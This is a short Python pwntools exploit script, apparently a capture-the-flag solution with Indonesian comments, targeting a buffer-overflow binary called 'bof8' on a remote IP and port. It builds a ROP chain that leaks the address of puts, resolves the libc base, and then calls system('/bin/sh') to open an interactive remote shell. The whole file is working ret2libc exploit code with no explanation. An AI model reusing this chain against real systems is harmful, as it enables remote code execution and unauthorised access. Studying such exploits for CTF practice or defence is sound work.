#nc 13.214.30.13 10009

from pwn import *
context.binary = binary = './bof8'

vuln = ELF(binary)
vuln_rop = ROP(vuln)

# Cara normal

payload = b'A'*16
# payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
# payload += p64(vuln.got.puts)
# payload += p64(vuln.plt.puts)
# payload += p64(vuln.symbols.main)

#cara rop
vuln_rop.call("puts", [vuln.got.puts])
vuln_rop.call("main")
payload += vuln_rop.chain()


p = remote("13.214.30.13", 10009)
# p = process('./bof8')

p.recvline()
p.sendline(payload)
puts = u64(p.recvline().rstrip().ljust(8, b"\x00"))
log.info("puts addr: " + hex(puts))

libc = ELF('./libc6_2.27-3ubuntu1.3_amd64.so')
libc.address = puts - libc.symbols.puts

payload = b'A'*16

#Cara normal 

# payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
# payload += p64(next(libc.search(b'/bin/sh')))
# payload += p64(vuln_rop.find_gadget(['ret'])[0])
# payload += p64(libc.symbols.system)

# Cara ROP
rop = ROP(libc)
rop.call("system", [next(libc.search(b'/bin/sh'))])
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += rop.chain()

p.sendline(payload)

p.interactive()